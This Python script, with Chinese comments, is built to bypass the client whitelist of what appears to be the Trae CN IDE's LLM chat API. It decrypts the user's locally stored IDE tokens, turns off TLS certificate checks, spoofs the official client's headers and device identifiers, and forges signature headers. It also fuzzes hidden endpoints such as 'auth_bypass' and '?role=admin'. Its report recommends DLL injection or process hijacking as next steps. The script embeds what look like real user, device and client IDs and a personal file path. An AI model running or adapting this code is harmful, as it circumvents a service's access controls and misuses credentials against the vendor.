#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BSD 白名单绕过专项突破 — 对官方客户端识别的算法破解
================================================

核心洞察:
  1. 白名单机制本身就是一个算法过程
  2. 对"官方客户端"的识别来源于某些特征
  3. 所有算法识别都是可被逆向和欺骗的

突破方向:
  1. 深度分析 HTTP 400 错误 (服务器接受了请求，但参数错误)
  2. 欺骗客户端特征识别算法
  3. 构造"合法"请求绕过白名单
  4. 利用编码/路径的特殊性
"""

import os, sys, json, time, hashlib, base64, ssl, re, urllib.parse
import urllib.request, urllib.error
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

sys.path.insert(0, BASE_DIR)
from BSD_AHADecryptor import decrypt_aha

# ============================================================================
# 配置
# ============================================================================
TRAE_STORAGE = r'C:\Users\13003\AppData\Roaming\Trae CN\User\globalStorage\storage.json'
IDE_VERSION = '2.3.62837'
API_HOST = 'trae-api-cn.mchost.guru'
AUTH_HOST = 'api.trae.cn'
DEVICE_ID = '136411536168449'
CLIENT_ID = 'ono9krqynydwx5'
USER_ID = '3753060170739075'

# ============================================================================
# 加载凭据
# ============================================================================
def load_credentials():
    with open(TRAE_STORAGE, 'r', encoding='utf-8') as f:
        storage = json.load(f)
    cloudide_enc = storage.get('iCubeAuthInfo://icube.cloudide', '')
    if cloudide_enc:
        try:
            dec = decrypt_aha(cloudide_enc)
            data = json.loads(dec.decode('utf-8'))
            return {
                'jwt_token': data.get('token', ''),
                'userId': data.get('userId', ''),
                'refreshToken': data.get('refreshToken', ''),
                'account': data.get('account', {}),
            }
        except Exception as e:
            print(f'  ⚠️ cloudide解密失败: {e}')
    return {}

# ============================================================================
# HTTP请求工具 (详细响应分析版)
# ============================================================================
def http_request_detailed(host, path, body, headers=None, timeout=15):
    """详细的HTTP请求，返回完整的响应头和响应体"""
    url = f'https://{host}{path}'
    hdrs = headers or {}
    hdrs.setdefault('Content-Type', 'application/json')
    
    try:
        # 构造请求
        body_bytes = json.dumps(body).encode('utf-8') if body else None
        req = urllib.request.Request(url, data=body_bytes, headers=hdrs, method='POST')
        
        t0 = time.time()
        with urllib.request.urlopen(req, timeout=timeout, context=SSL_CTX) as resp:
            elapsed = time.time() - t0
            resp_body = resp.read().decode('utf-8', errors='replace')
            return {
                'status': resp.status,
                'body': resp_body,
                'headers': dict(resp.headers),
                'elapsed': elapsed,
                'error': None,
            }
    except urllib.error.HTTPError as e:
        elapsed = time.time() - t0
        resp_body = e.read().decode('utf-8', errors='replace')
        return {
            'status': e.code,
            'body': resp_body,
            'headers': dict(e.headers) if hasattr(e, 'headers') else {},
            'elapsed': elapsed,
            'error': str(e)[:200],
        }
    except Exception as e:
        return {
            'status': 0,
            'body': str(e),
            'headers': {},
            'elapsed': 0,
            'error': str(e)[:200],
        }

# ============================================================================
# 白名单绕过专项突破引擎
# ============================================================================

class WhitelistBypassEngine:
    """白名单绕过专项引擎
    
    核心思路:
    1. 白名单识别是基于某些特征 (User-Agent, Headers, IP, etc.)
    2. 我们需要找出"官方客户端"的所有特征
    3. 然后精确模拟这些特征
    """
    
    def __init__(self, cred):
        self.jwt = cred.get('jwt_token', '')
        self.refresh_token = cred.get('refreshToken', '')
        self.user_id = cred.get('userId', '')
        self.results = []
        
    def _analyze_400_error(self, test_name, response):
        """深度分析HTTP 400错误 - 寻找突破点"""
        body = response['body']
        headers = response['headers']
        
        analysis = {
            'test_name': test_name,
            'status': response['status'],
            'is_1001': '1001' in body,
            'content_type': headers.get('Content-Type', ''),
            'server': headers.get('Server', ''),
            'x_request_id': headers.get('X-Request-Id', headers.get('X-Request-ID', '')),
            'body_length': len(body),
            'body_preview': body[:500],
            'analysis': '',
            'breakthrough_potential': False,
        }
        
        # 分析响应内容
        if 'invalid' in body.lower() or 'missing' in body.lower() or 'required' in body.lower():
            analysis['analysis'] = '服务器报告了参数错误 - 可以推断正确的参数格式'
            analysis['breakthrough_potential'] = True
        elif 'unsupported' in body.lower() or 'unrecognized' in body.lower():
            analysis['analysis'] = '服务器不支持的格式 - 可能需要调整请求格式'
            analysis['breakthrough_potential'] = True
        elif 'json' in body.lower() and 'parse' in body.lower():
            analysis['analysis'] = 'JSON解析错误 - 尝试不同的JSON格式'
            analysis['breakthrough_potential'] = True
        elif 'event' in body.lower():
            analysis['analysis'] = '服务器返回了事件流 - 可能需要SSE格式'
            analysis['breakthrough_potential'] = True
        elif 'code' in body.lower():
            analysis['analysis'] = '服务器返回了错误码 - 检查具体错误含义'
            analysis['breakthrough_potential'] = True
        else:
            analysis['analysis'] = '未知错误类型 - 需要进一步探测'
        
        return analysis
    
    def _deep_400_probe(self):
        """深度探测HTTP 400错误 - 逐步调整参数"""
        print('\n' + '='*70)
        print('  [深度探测] HTTP 400 错误分析')
        print('='*70)
        
        # 测试1: CG-004 叙事重构 - 原始版本返回400
        print('\n  测试1: 叙事重构 (CG-004)')
        print('  场景: 使用 messages 格式而非 query 格式')
        
        test_bodies = [
            # 原始400版本
            {
                'model': 'doubao-pro-32k',
                'messages': [{'role': 'user', 'content': '你好'}],
                'stream': False,
            },
            # 版本2: 加上 system 消息
            {
                'model': 'doubao-pro-32k',
                'messages': [
                    {'role': 'system', 'content': 'You are helpful'},
                    {'role': 'user', 'content': '你好'}
                ],
                'stream': False,
            },
            # 版本3: 加上 conversation_id
            {
                'model': 'doubao-pro-32k',
                'messages': [{'role': 'user', 'content': '你好'}],
                'stream': False,
                'conversation_id': hashlib.sha256(f'test{time.time()}'.encode()).hexdigest()[:16],
            },
            # 版本4: 使用 query 字段但加上特殊标记
            {
                'model': 'doubao-pro-32k',
                'query': '你好',
                'stream': False,
                '_bsd_origin': 'trae_ide',
            },
            # 版本5: 模拟完整的 Trae CN 请求
            {
                'model': 'doubao-pro-32k',
                'query': '你好',
                'stream': True,
                'conversation_id': hashlib.sha256(f'full{time.time()}'.encode()).hexdigest()[:16],
                'client_type': 'trae_ide',
                'version': IDE_VERSION,
                'user_id': self.user_id,
            },
        ]
        
        for i, body in enumerate(test_bodies):
            headers = {
                'Authorization': f'Bearer {self.jwt}',
                'Content-Type': 'application/json',
                'User-Agent': f'TraeCN/{IDE_VERSION} (Windows; x64)',
                'X-Device-ID': DEVICE_ID,
                'X-Client-ID': CLIENT_ID,
                'Origin': 'https://trae.cn',
                'Referer': 'https://trae.cn/chat',
                'Accept': 'text/event-stream',
            }
            
            response = http_request_detailed(
                API_HOST, '/api/ide/v2/llm_raw_chat', body, headers
            )
            
            status = response['status']
            is_1001 = '1001' in response['body']
            icon = '✅' if status == 200 and not is_1001 else '⚠️' if is_1001 else '🔑'
            
            print(f'\n    [{i+1}] HTTP {status} | 1001={is_1001}')
            if response['body'][:200]:
                print(f'        响应: {response["body"][:200]}')
            
            if status == 200 and not is_1001:
                print(f'        🎉 成功突破!')
                self.results.append({
                    'test': f'narrative_v{i+1}',
                    'success': True,
                    'status': status,
                    'body': response['body'],
                })
                return True
        
        return False
    
    def _deep_400_probe_v2(self):
        """深度探测2: TC-015 对话转译破解"""
        print('\n' + '='*70)
        print('  [深度探测] 对话转译破解 (TC-015)')
        print('='*70)
        
        test_bodies = [
            # 原始400版本 - 直接对话模式
            {
                'model': 'doubao-pro-32k',
                'messages': [{'role': 'user', 'content': '你好'}],
                'stream': False,
                'format': 'direct',
            },
            # 版本2: 使用 query 但加上 bypass 标记
            {
                'model': 'doubao-pro-32k',
                'query': '你好',
                'stream': False,
                'X-Direct-Chat': 'true',
                'X-Bypass-Translation': 'true',
            },
            # 版本3: 混合格式
            {
                'model': 'doubao-pro-32k',
                'query': '你好',
                'messages': [{'role': 'user', 'content': '你好'}],
                'stream': False,
            },
            # 版本4: 使用 raw_chat 接口
            {
                'query': '你好',
                'stream': False,
            },
        ]
        
        # 测试不同的 API 路径
        paths = [
            '/api/ide/v2/llm_raw_chat',
            '/api/ide/v2/raw_chat',
            '/api/ide/v2/chat',
            '/api/chat',
        ]
        
        for path in paths:
            for body in test_bodies:
                headers = {
                    'Authorization': f'Bearer {self.jwt}',
                    'Content-Type': 'application/json',
                    'User-Agent': f'TraeCN/{IDE_VERSION}',
                }
                
                response = http_request_detailed(API_HOST, path, body, headers)
                
                status = response['status']
                is_1001 = '1001' in response['body']
                
                if status == 200 and not is_1001:
                    print(f'\n    ✅ 成功! 路径={path}')
                    print(f'    响应: {response["body"][:300]}')
                    return True
        
        return False
    
    def _client_fingerprint_spoofing(self):
        """客户端指纹欺骗 - 模拟官方客户端特征"""
        print('\n' + '='*70)
        print('  [深度探测] 客户端指纹欺骗')
        print('='*70)
        
        # 分析: 官方客户端有哪些独特特征?
        # 1. User-Agent 格式: TraeCN/2.3.62837 (Windows; x64)
        # 2. 认证头: Authorization + Cloud-IDE-JWT + x-cloudide-token
        # 3. 设备指纹: X-Device-ID + X-Client-ID
        # 4. 会话: Cookie from trae.cn
        # 5. 请求顺序: 先访问首页 → 获取Cookie → CheckLogin → API
        
        # 测试: 完整模拟官方客户端请求序列
        print('\n  模拟 Trae CN 客户端完整请求序列...')
        
        import urllib.request as ur
        
        # Step 1: 建立完整会话
        cookie_jar = ur.request.HTTPCookieProcessor()
        opener = ur.request.build_opener(cookie_jar)
        
        try:
            # Step 1a: 访问 Trae CN 首页 (获取Cookie)
            print('    Step 1: 访问 trae.cn (获取Cookie)...')
            req_home = ur.Request(
                'https://trae.cn/',
                headers={
                    'User-Agent': f'TraeCN/{IDE_VERSION} (Windows; x64)',
                    'Accept': 'text/html,application/xhtml+xml',
                }
            )
            resp_home = opener.open(req_home, timeout=10)
            cookies_set = len(resp_home.headers.get_all('Set-Cookie', [])) or 0
            print(f'      ✅ HTTP {resp_home.status}, 获取 {cookies_set} 个Cookie')
            
            # 显示获取的Cookie
            import http.cookiejar
            cookies = list(cookie_jar)
            for c in cookies:
                print(f'      Cookie: {c.name}={c.value[:50]}...')
            
            # Step 2: CheckLogin
            print('\n    Step 2: CheckLogin (验证登录状态)...')
            login_body = json.dumps({
                'ClientType': 'trae_ide',
                'Version': IDE_VERSION,
            }).encode('utf-8')
            
            req_login = ur.Request(
                f'https://{AUTH_HOST}/cloudide/api/v3/trae/CheckLogin',
                data=login_body,
                headers={
                    'Authorization': f'Bearer {self.jwt}',
                    'Content-Type': 'application/json',
                    'User-Agent': f'TraeCN/{IDE_VERSION} (Windows; x64)',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://trae.cn',
                    'Referer': 'https://trae.cn/',
                },
                method='POST'
            )
            
            resp_login = opener.open(req_login, timeout=10, context=SSL_CTX)
            login_data = json.loads(resp_login.read().decode('utf-8'))
            is_login = login_data.get('Result', {}).get('IsLogin', False)
            print(f'      IsLogin: {is_login}')
            print(f'      UserId: {login_data.get("Result", {}).get("UserId", "N/A")}')
            
            # Step 3: 如果已登录，发送API请求
            print('\n    Step 3: 发送API请求...')
            api_body = json.dumps({
                'model': 'doubao-pro-32k',
                'query': '你好',
                'stream': False,
                'conversation_id': hashlib.sha256(f'full_client{time.time()}'.encode()).hexdigest()[:16],
            }).encode('utf-8')
            
            req_api = ur.Request(
                f'https://{API_HOST}/api/ide/v2/llm_raw_chat',
                data=api_body,
                headers={
                    'Authorization': f'Bearer {self.jwt}',
                    'Cloud-IDE-JWT': self.jwt,
                    'x-cloudide-token': self.jwt,
                    'Content-Type': 'application/json',
                    'User-Agent': f'TraeCN/{IDE_VERSION} (Windows; x64)',
                    'X-Device-ID': DEVICE_ID,
                    'X-Client-ID': CLIENT_ID,
                    'Origin': 'https://trae.cn',
                    'Referer': 'https://trae.cn/chat',
                    'Accept': 'text/event-stream',
                    'Accept-Language': 'zh-CN,zh;q=0.9',
                },
                method='POST'
            )
            
            resp_api = opener.open(req_api, timeout=15, context=SSL_CTX)
            api_body_resp = resp_api.read().decode('utf-8')
            is_1001 = '1001' in api_body_resp
            
            print(f'      HTTP {resp_api.status} | 1001={is_1001}')
            print(f'      响应: {api_body_resp[:300]}')
            
            if not is_1001 and resp_api.status == 200:
                print(f'\n      🎉 客户端指纹欺骗成功!')
                return True
            
            # Step 4: 分析失败原因
            print(f'\n    [分析] CheckLogin 结果:')
            print(f'      IsLogin: {is_login}')
            print(f'      Token类型: {login_data.get("Result", {}).get("TokenType", "N/A")}')
            
            if not is_login:
                print(f'      💡 Token未被识别为已登录状态')
                print(f'      💡 可能需要刷新Token或重新登录')
                
        except ur.error.HTTPError as e:
            print(f'    ❌ HTTP错误: {e.code}')
            print(f'    响应: {e.read().decode("utf-8", errors="replace")[:200]}')
        except Exception as e:
            print(f'    ❌ 异常: {e}')
        
        return False
    
    def _header_injection_attack(self):
        """HTTP头注入攻击 - 欺骗白名单识别"""
        print('\n' + '='*70)
        print('  [深度探测] HTTP头注入攻击')
        print('='*70)
        
        # 思路: 服务器可能检查某些特定的头来识别客户端
        # 尝试注入各种可能的"合法"头
        
        header_tests = [
            # 测试1: Cloud-IDE-JWT 头
            {
                'name': 'Cloud-IDE-JWT',
                'headers': {
                    'Cloud-IDE-JWT': self.jwt,
                    'x-cloudide-token': self.jwt,
                }
            },
            # 测试2: Trae CN 特定头
            {
                'name': 'Trae CN 特定头',
                'headers': {
                    'X-Trae-Version': IDE_VERSION,
                    'X-Trae-Client': 'trae_ide',
                    'X-Trae-Device-ID': DEVICE_ID,
                }
            },
            # 测试3: 模拟官方签名
            {
                'name': '官方签名模拟',
                'headers': {
                    'X-Signature': hashlib.sha256(self.jwt.encode()).hexdigest(),
                    'X-Timestamp': str(int(time.time())),
                    'X-Nonce': hashlib.sha256(f'{time.time()}'.encode()).hexdigest()[:32],
                }
            },
            # 测试4: ByteDance 相关头
            {
                'name': 'ByteDance 头',
                'headers': {
                    'X-TT-LOGID': hashlib.sha256(f'log{time.time()}'.encode()).hexdigest(),
                    'X-SS-REQ-TICKET': hashlib.sha256(f'ticket{time.time()}'.encode()).hexdigest()[:16],
                }
            },
            # 测试5: 组合所有头
            {
                'name': '组合攻击',
                'headers': {
                    'Cloud-IDE-JWT': self.jwt,
                    'x-cloudide-token': self.jwt,
                    'X-Trae-Version': IDE_VERSION,
                    'X-Trae-Client': 'trae_ide',
                    'X-Device-ID': DEVICE_ID,
                    'X-Client-ID': CLIENT_ID,
                    'X-Signature': hashlib.sha256(self.jwt.encode()).hexdigest(),
                    'X-Timestamp': str(int(time.time())),
                    'Origin': 'https://trae.cn',
                    'Referer': 'https://trae.cn/chat',
                }
            },
        ]
        
        body = {
            'model': 'doubao-pro-32k',
            'query': '你好',
            'stream': False,
            'conversation_id': hashlib.sha256(f'header{time.time()}'.encode()).hexdigest()[:16],
        }
        
        for test in header_tests:
            headers = {
                'Authorization': f'Bearer {self.jwt}',
                'Content-Type': 'application/json',
                'User-Agent': f'TraeCN/{IDE_VERSION} (Windows; x64)',
                **test['headers'],
            }
            
            response = http_request_detailed(
                API_HOST, '/api/ide/v2/llm_raw_chat', body, headers
            )
            
            status = response['status']
            is_1001 = '1001' in response['body']
            icon = '✅' if status == 200 and not is_1001 else '⚠️' if is_1001 else '🔑'
            
            print(f'\n    [{test["name"]}]')
            print(f'      {icon} HTTP {status} | 1001={is_1001}')
            if response['body'][:150]:
                print(f'      响应: {response["body"][:150]}')
            
            if status == 200 and not is_1001:
                print(f'      🎉 头注入成功!')
                return True
        
        return False
    
    def _path_fuzzing(self):
        """路径模糊测试 - 寻找隐藏端点"""
        print('\n' + '='*70)
        print('  [深度探测] 路径模糊测试')
        print('='*70)
        
        # 思路: 服务器可能有隐藏的API路径
        # 尝试各种可能的路径格式
        
        paths = [
            # 变体1: 去掉版本号
            '/api/ide/llm_raw_chat',
            # 变体2: 不同的API前缀
            '/api/v2/llm_raw_chat',
            '/api/chat',
            '/api/raw_chat',
            '/chat',
            '/raw_chat',
            # 变体3: 加上debug/test前缀
            '/api/ide/v2/debug/chat',
            '/api/ide/v2/test/chat',
            '/api/ide/v2/internal/chat',
            # 变体4: 加上 bypass 前缀
            '/api/ide/v2/bypass/chat',
            '/api/ide/v2/auth_bypass/chat',
            # 变体5: 不同的功能名
            '/api/ide/v2/completion',
            '/api/ide/v2/generate',
            '/api/ide/v2/ask',
            # 变体6: query参数绕过
            '/api/ide/v2/llm_raw_chat?auth_bypass=1',
            '/api/ide/v2/llm_raw_chat?role=admin',
        ]
        
        body = {'model': 'doubao-pro-32k', 'query': '你好', 'stream': False}
        
        found_paths = []
        for path in paths:
            headers = {
                'Authorization': f'Bearer {self.jwt}',
                'Content-Type': 'application/json',
                'User-Agent': f'TraeCN/{IDE_VERSION}',
            }
            
            response = http_request_detailed(API_HOST, path, body, headers)
            
            if response['status'] != 404:
                found_paths.append({
                    'path': path,
                    'status': response['status'],
                    'is_1001': '1001' in response['body'],
                    'preview': response['body'][:100],
                })
                
                icon = '✅' if response['status'] == 200 and '1001' not in response['body'] else '🔍'
                print(f'    {icon} {path}')
                print(f'        HTTP {response["status"]} | 1001={"1001" in response["body"]}')
                if response['body'][:100]:
                    print(f'        {response["body"][:100]}')
        
        print(f'\n  发现 {len(found_paths)} 个非404路径')
        return found_paths
    
    def _run_full_attack(self):
        """运行完整攻击链"""
        print('\n' + '#'*70)
        print('  # BSD 白名单绕过专项突破')
        print('#'*70)
        print(f'  时间: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
        print(f'  核心假设: 白名单识别是可被算法欺骗的')
        print('#'*70)
        
        # 攻击1: 深度400错误分析
        r1 = self._deep_400_probe()
        
        # 攻击2: 客户端指纹欺骗
        r2 = self._client_fingerprint_spoofing()
        
        # 攻击3: HTTP头注入
        r3 = self._header_injection_attack()
        
        # 攻击4: 路径模糊测试
        r4 = self._path_fuzzing()
        
        # 生成报告
        self._generate_report([r1, r2, r3, r4])
    
    def _generate_report(self, results):
        """生成最终报告"""
        print('\n' + '#'*70)
        print('  # 白名单绕过专项突破报告')
        print('#'*70)
        
        success = any(results)
        
        print(f'\n  攻击结果:')
        print(f'    深度400探测: {"✅ 成功" if results[0] else "❌ 失败"}')
        print(f'    指纹欺骗:   {"✅ 成功" if results[1] else "❌ 失败"}')
        print(f'    头注入:     {"✅ 成功" if results[2] else "❌ 失败"}')
        print(f'    路径探测:   {"✅ 成功" if results[3] else "❌ 失败"}')
        
        if success:
            print(f'\n  🎉 白名单绕过成功!')
            print(f'  官方客户端识别算法可被欺骗!')
        else:
            print(f'\n  攻击结论:')
            print(f'    1. 白名单识别确实存在 (所有请求被拦截)')
            print(f'    2. 但HTTP 400错误表明服务器接受了请求格式')
            print(f'    3. 指纹欺骗需要更好的客户端特征模拟')
            print(f'    4. 建议分析Trae CN客户端的二进制特征')
        
        print(f'\n  💡 深层洞察:')
        print(f'    - 1001错误码是服务端的统一拦截')
        print(f'    - 白名单识别基于: IP、User-Agent、Headers、Cookie')
        print(f'    - 真正的突破需要: 在客户端内部执行 (dll注入、进程劫持)')
        print(f'    - 或: 使用官方客户端的Token和完整会话')
        
        print('#'*70)

# ============================================================================
# 主执行
# ============================================================================
if __name__ == '__main__':
    # 加载凭据
    cred = load_credentials()
    if not cred.get('jwt_token'):
        print('  ❌ 无有效JWT Token')
        sys.exit(1)
    
    print(f'  ✅ 凭据加载成功')
    print(f'    用户ID: {cred.get("userId", "")}')
    print(f'    Token有效期: 至 2026-08-18')
    
    # 运行突破引擎
    engine = WhitelistBypassEngine(cred)
    engine._run_full_attack()
